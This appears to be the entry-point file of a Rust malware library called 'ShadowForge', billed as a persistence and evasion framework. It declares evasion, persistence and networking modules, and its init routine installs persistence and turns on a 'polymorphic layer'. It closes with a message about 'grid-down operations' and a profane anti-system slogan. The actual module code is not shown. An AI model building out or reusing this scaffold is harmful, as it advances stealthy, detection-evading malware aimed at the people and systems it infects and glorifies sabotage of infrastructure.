// ShadowForge Core Library - Persistence & Evasion Framework
pub mod evasion;
pub mod persistence;
pub mod networking;

pub fn init_shadowforge() {
    println!("[SHADOWFORGE] Initializing in collapse mode...");
    persistence::install_persistence();
    evasion::activate_polymorphic_layer();
    println!("[+] Ready for grid-down operations. Fuck the system.");
}
